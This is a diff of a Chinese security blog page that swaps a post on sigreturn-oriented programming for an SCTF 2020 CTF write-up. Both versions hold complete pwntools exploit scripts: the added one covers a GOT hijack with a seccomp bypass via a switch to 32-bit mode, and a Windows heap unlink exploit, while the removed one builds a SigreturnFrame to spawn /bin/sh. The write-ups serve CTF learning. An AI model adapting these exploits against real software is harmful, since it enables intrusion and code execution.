@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn,">
+  <meta name="keywords" content="pwn,ctf,">
 
 
 
@@ -79,20 +79,18 @@
 
 
 
-<meta name="description" content="srop主要学习来源来自 ctf-wiki上的介绍：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop原理、exp和题目不想做搬运，里面都可以找到这里主要谈一下自己的心得：现附上一张图">
-<meta name="keywords" content="pwn">
+<meta name="description" content="跟着队伍参加了这次SCTF，做了两个PWN，分别是linux和win平台下的堆利用题目（linux考察的是shellcode），运气好抢到了一个一血（不过貌似不是前5个一血，没有书恰，难顶。）">
+<meta name="keywords" content="pwn,ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="栈溢出进阶——srop">
-<meta property="og:url" content="https://sh1ner.github.io/2019/09/13/srop/index.html">
+<meta property="og:title" content="SCTF 2020 PWN">
+<meta property="og:url" content="https://sh1ner.github.io/2020/07/07/SCTF-2020-PWN/index.html">
 <meta property="og:site_name" content="luckyu&#39;s blog">
-<meta property="og:description" content="srop主要学习来源来自 ctf-wiki上的介绍：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop原理、exp和题目不想做搬运，里面都可以找到这里主要谈一下自己的心得：现附上一张图">
+<meta property="og:description" content="跟着队伍参加了这次SCTF，做了两个PWN，分别是linux和win平台下的堆利用题目（linux考察的是shellcode），运气好抢到了一个一血（不过貌似不是前5个一血，没有书恰，难顶。）">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://sh1ner.github.io/2019/09/13/srop/images/1.png">
-<meta property="og:updated_time" content="2019-09-13T13:16:46.775Z">
+<meta property="og:updated_time" content="2020-07-07T00:38:17.907Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="栈溢出进阶——srop">
-<meta name="twitter:description" content="srop主要学习来源来自 ctf-wiki上的介绍：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop原理、exp和题目不想做搬运，里面都可以找到这里主要谈一下自己的心得：现附上一张图">
-<meta name="twitter:image" content="https://sh1ner.github.io/2019/09/13/srop/images/1.png">
+<meta name="twitter:title" content="SCTF 2020 PWN">
+<meta name="twitter:description" content="跟着队伍参加了这次SCTF，做了两个PWN，分别是linux和win平台下的堆利用题目（linux考察的是shellcode），运气好抢到了一个一血（不过貌似不是前5个一血，没有书恰，难顶。）">
 
 
 
@@ -122,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="https://sh1ner.github.io/2019/09/13/srop/">
+  <link rel="canonical" href="https://sh1ner.github.io/2020/07/07/SCTF-2020-PWN/">
 
 
 
 
 
-  <title>栈溢出进阶——srop | luckyu's blog</title>
+  <title>SCTF 2020 PWN | luckyu's blog</title>
   
 
 
@@ -277,7 +275,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sh1ner.github.io/2019/09/13/srop/">
+    <link itemprop="mainEntityOfPage" href="https://sh1ner.github.io/2020/07/07/SCTF-2020-PWN/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content>
@@ -294,7 +292,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">栈溢出进阶——srop</h1>
+          <h1 class="post-title" itemprop="name headline">SCTF 2020 PWN</h1>
         
 
         <div class="post-meta">
@@ -306,8 +304,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-13T11:36:24+08:00">
-                2019-09-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-07T07:42:27+08:00">
+                2020-07-07
               </time>
             
 
@@ -344,18 +342,18 @@
       
 
       
-        <p>srop主要学习来源来自 ctf-wiki上的介绍：<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a><br>原理、exp和题目不想做搬运，里面都可以找到<br>这里主要谈一下自己的心得：现附上一张图</p>
+        <p>跟着队伍参加了这次SCTF，做了两个PWN，分别是linux和win平台下的堆利用题目（linux考察的是shellcode），运气好抢到了一个一血（不过貌似不是前5个一血，没有书恰，难顶。）</p>
 <a id="more"></a>
-<p><img src="images/1.png" alt="示例图片1"><br>这个是根据ctf-wiki上的exp构造的栈空间的流程，可以发现大概利用流程就是通过read读入字节数的返回值修改rax，再将sigframe结构体写入栈中，再通过read读取syscall至返回地址，拼接字节使其返回值为15，从而执行sigreturn，又因为sigframe设置rip为syscall再次调用,执行execve(‘/bin/sh’,0,0)<br>由于直接将返回值改为syscall,会破坏rsp，无法继续read sigframe,所以采用两次读取sigframe，第一次目的是将rsp置为原址，并将返回地址main和第二个sigframe读入栈中，然后回到main执行read(0,rsp,0x400)，置rax为15，即可getshell<br>注意：一定要加上context.arch = ‘amd64’，关系到SigreturnFrame()的内容</p>
-<p>接下来是实战了一道例题：ciscn_2019_es_7，buuoj上有题目复现<br>其中提供了方便利用的gadget</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000004004ED <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004ED                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004EE                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004F1                 <span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004F4                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">400h</span>       <span class="comment">; count</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004F9                 <span class="keyword">lea</span>     <span class="built_in">rsi</span>, [<span class="built_in">rsp</span>+buf]  <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004FE                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400501</span>                 <span class="keyword">syscall</span>                 <span class="comment">; LINUX - sys_read</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400503</span>                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040050A                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">30h</span>        <span class="comment">; count</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040050F                 <span class="keyword">lea</span>     <span class="built_in">rsi</span>, [<span class="built_in">rsp</span>+buf]  <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400514</span>                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400517</span>                 <span class="keyword">syscall</span>                 <span class="comment">; LINUX - sys_write</span></span><br></pre></td></tr></table></figure>
+<h1 id="coolcode"><a href="#coolcode" class="headerlink" title="coolcode"></a>coolcode</h1><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>漏洞点很好找，在申请堆块的函数中，对数组下标错误的使用了有符号数，导致如果我们输入负数也可以满足<code>v1 &lt;= 1</code>这样的检测，而在数组上方保存了例如stdin\stdout\stderr、got表等这样的可利用信息，最开始我的想法是覆盖stdin然后通过劫持IOFILE结构体实现ROP，经队友提醒，这个程序并没有开启FULL RELRO所以got表可写，这样其实我们可以直接劫持got表。<br>程序在我们输入信息中加入了check，限制了输入的字符（只能是大写字母和数字），如果不符合便执行exit()，这很大程度影响了我们的shellcode编写，不过我们只需要将exit_got改成ret就可以绕过，程序中heap和一段bss是rwx权限，我们可以任意在其中编写shellcode，然后通过劫持got表进行调用，可以用的函数有很多，我这里采用了free()</p>
+<h2 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h2><p>程序中运用了prctl来限制了我们能使用的系统调用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0006</span><br><span class="line"> 0002: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000005  if (A == fstat) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00050005  return ERRNO(5)</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000004004D6 gadgets         proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004D6 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004D6                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004D7                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004DA                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="number">0Fh</span>			<span class="comment">;修改rax为0xf 可执行sigreturn</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E1                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E1 gadgets         endp <span class="comment">; sp-analysis failed</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E1</span><br><span class="line"><span class="symbol">.text:</span>00000000004004E2 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E2                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="number">3Bh</span>			<span class="comment">;修改rax为0x3b 可执行execve</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004004E9                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这里面只允许了部分系统调用通过，因为没有open，我们无法使用常规的orw读取flag，但是其实只要查询系统调用号表，就可发现fstat这个函数对应的系统调用号5，其实就是32位程序中open的系统调用号，而汇编中存在一条指令retfq可以供我们切换到32位指令模式，其原理是一个cs寄存器，cs=0x23时表示32位模式，cs=0x33时表示64位模式，我们只需要在进行retfq时保证此时rsp=shellcode地址，rsp+8=0x23/0x33，就可以在我们想要的模式下执行shellcode。<br>这道题我们的思路就很清晰：因为程序限定了读取字节长度，为了方便一次性执行shellcode，我们先写入read将后面shellcode写入到bss段并执行。shellcode的内容：首先切换32位模式执行open()然后切换回64位执行read()、write()即可读取到flag</p>
+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">prog = <span class="string">'./CoolCode'</span></span><br><span class="line"><span class="comment">#p = process(prog)</span></span><br><span class="line">p = remote(<span class="string">"39.107.119.192 "</span>, <span class="number">9999</span>)	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">	p.sendafter(<span class="string">"messages: "</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"choice :"</span>, <span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">	read = <span class="string">'''</span></span><br><span class="line"><span class="string">	    xor eax, eax</span></span><br><span class="line"><span class="string">        mov edi, eax</span></span><br><span class="line"><span class="string">        push 0x60</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        mov esi, 0x1010101</span></span><br><span class="line"><span class="string">        xor esi, 0x1612601</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov esp, esi</span></span><br><span class="line"><span class="string">        retfq</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">	open_x86 = <span class="string">'''</span></span><br><span class="line"><span class="string">		mov esp, 0x602770</span></span><br><span class="line"><span class="string">		push 0x67616c66</span></span><br><span class="line"><span class="string">		push esp</span></span><br><span class="line"><span class="string">		pop ebx</span></span><br><span class="line"><span class="string">		xor ecx,ecx</span></span><br><span class="line"><span class="string">		mov eax,5</span></span><br><span class="line"><span class="string">		int 0x80</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	readflag = <span class="string">'''</span></span><br><span class="line"><span class="string">		push 0x33</span></span><br><span class="line"><span class="string">		push 0x60272e</span></span><br><span class="line"><span class="string">		retfq</span></span><br><span class="line"><span class="string">		mov rdi,0x3</span></span><br><span class="line"><span class="string">		mov rsi,rsp</span></span><br><span class="line"><span class="string">		mov rdx,0x60</span></span><br><span class="line"><span class="string">		xor rax,rax</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		mov rdi,1</span></span><br><span class="line"><span class="string">		mov rax,1</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	readflag = asm(readflag, arch = <span class="string">'amd64'</span>)</span><br><span class="line">	add(<span class="number">-22</span>, <span class="string">'\xc3'</span>)</span><br><span class="line">	add(<span class="number">-37</span>, asm(read, arch = <span class="string">'amd64'</span>))</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	free(<span class="number">0</span>)</span><br><span class="line">	payload = p64(<span class="number">0x602710</span>)+p64(<span class="number">0x23</span>)+asm(open_x86)+readflag</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	exp()</span><br></pre></td></tr></table></figure>
 
-<p>由于这道题不知道怎么使用execve，就直接运用sigreturn来做了<br>主要利用过程就是先得到栈地址，由于返回地址要覆盖成read，所以只能找到一个栈空间下面的一段偏移，题目未开启pie则可以通过计算找到binsh字符串，然后就是写入sigframe，再利用给的gadget将rax设置为15即可<br>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./ciscn_2019_es_7')</span></span><br><span class="line">p = remote(<span class="string">'pwn.buuoj.cn'</span>, <span class="number">20179</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gadget = <span class="number">0x4004da</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">read = <span class="number">0x4004ed</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">16</span> + p64(read)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvn(<span class="number">32</span>)</span><br><span class="line">stack_addr = u64(p.recvn(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">log.success(<span class="string">'leak stack addr :'</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## call execv("/bin/sh",0,0)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr - <span class="number">280</span>  <span class="comment"># "/bin/sh" 's addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0</span>) + p64(gadget) + p64(syscall_ret) + str(sigframe)</span><br><span class="line"><span class="keyword">print</span> len(frame_payload)</span><br><span class="line">payload = frame_payload </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
+<h1 id="EasyWinHeap"><a href="#EasyWinHeap" class="headerlink" title="EasyWinHeap"></a>EasyWinHeap</h1><p>在看到这道题之前其实对win平台下的pwn利用几乎没有任何了解，所以能做出这道题多多少少沾点运气，就简单说一下我的思路吧，后续会对win heap结构做一下总结，来说明其中原理。在代码审计过程发现程序存在uaf和堆溢出，而且结合程序中在堆里面申请了一个0x80的空间用来存放堆指针和程序的功能函数指针puts，可以想到如果我们能劫持这个堆块，覆盖掉puts函数指针就可以任意函数调用，而且参数也可控制。在简单的学习了windows heap结构，发现有一个unlink的操作似乎我们可以利用，我们可以修改破坏free chunk的链表环状结构，制造一个我们的链表，从而当unlink时就可以修改其他堆块中的内容，因为有uaf我们可以泄露free chunk的内容得到堆地址，经过在od中简单调试，果然可以直接劫持开头的0x80的堆块，这样就可以肆无忌惮的任意读写内容。<br>之后的任务就顺利成章，先是泄露puts iat表的内容可以得到puts的真实地址，然后通过计算得到dll文件的加载基址，就可以得到system地址了。</p>
+<p>完整EXP(需要在堆地址为4字节时在可以打通)：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p = remote(<span class="string">"47.94.245.208"</span>, <span class="number">23333</span>)</span><br><span class="line">    	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"option &gt;\r\n"</span>, <span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"size &gt;\r\n"</span>, str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"option &gt;\r\n"</span>, <span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index &gt;\r\n"</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"option &gt;\r\n"</span>, <span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index &gt;\r\n"</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"option &gt;\r\n"</span>, <span class="string">'4'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index &gt;\r\n"</span>, str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"content  &gt;\r\n"</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">		add(<span class="number">32</span>)</span><br><span class="line">	free(<span class="number">2</span>)</span><br><span class="line">	free(<span class="number">4</span>)</span><br><span class="line">	show(<span class="number">2</span>)</span><br><span class="line">	heap_addr = u32(p.recvuntil(<span class="string">"\r"</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])</span><br><span class="line">	log.info(<span class="string">"heap_addr ==&gt; "</span> + hex(heap_addr))</span><br><span class="line">	edit(<span class="number">2</span>, p32(heap_addr<span class="number">-0xd8</span>)+p32(heap_addr<span class="number">-0xd4</span>))</span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	show(<span class="number">2</span>)</span><br><span class="line">	p.recv(<span class="number">4</span>)</span><br><span class="line">	image_base = u32(p.recv(<span class="number">4</span>))<span class="number">-0x1043</span></span><br><span class="line">	log.info(<span class="string">"image_base ==&gt; "</span> + hex(image_base))</span><br><span class="line">	puts_iat = image_base + <span class="number">0x20c4</span></span><br><span class="line">	log.info(<span class="string">"puts_iat  ==&gt; "</span> + hex(puts_iat))</span><br><span class="line">	edit(<span class="number">2</span>, p32(puts_iat)+p32(image_base+<span class="number">0x1040</span>)+p32(heap_addr<span class="number">-0xe8</span>))</span><br><span class="line">	show(<span class="number">2</span>)</span><br><span class="line">	ucrtbase = u32(p.recv(<span class="number">4</span>))<span class="number">-0xb89f0</span></span><br><span class="line">	log.info(<span class="string">"ucrtbase  ==&gt; "</span> + hex(ucrtbase))</span><br><span class="line">	system = ucrtbase+<span class="number">0xefda0</span></span><br><span class="line">	edit(<span class="number">0</span>, <span class="string">'cmd\x00'</span>)</span><br><span class="line">	edit(<span class="number">3</span>, p32(system)+p32(heap_addr<span class="number">-0x60</span>))</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	exp()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -374,6 +372,8 @@
           
             <a href="/tags/pwn/" rel="tag"># pwn</a>
           
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
         </div>
       
 
@@ -385,8 +385,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/18/jarvisoj-pwn-freenote-x64/" rel="next" title="jarvisoj-level6_x64-实战unlink利用">
-                <i class="fa fa-chevron-left"></i> jarvisoj-level6_x64-实战unlink利用
+              <a href="/2020/03/20/starctf-chrome-oob/" rel="next" title="Starctf-oob-Chrome V8学习">
+                <i class="fa fa-chevron-left"></i> Starctf-oob-Chrome V8学习
               </a>
             
           </div>
@@ -394,10 +394,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/09/13/buuctf-pwn/" rel="prev" title="记录一下在buuctf刷的几个pwn题">
-                记录一下在buuctf刷的几个pwn题 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -453,8 +449,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -521,6 +526,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#coolcode"><span class="nav-number">1.</span> <span class="nav-text">coolcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞点"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#沙箱绕过"><span class="nav-number">1.2.</span> <span class="nav-text">沙箱绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp"><span class="nav-number">1.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EasyWinHeap"><span class="nav-number">2.</span> <span class="nav-text">EasyWinHeap</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
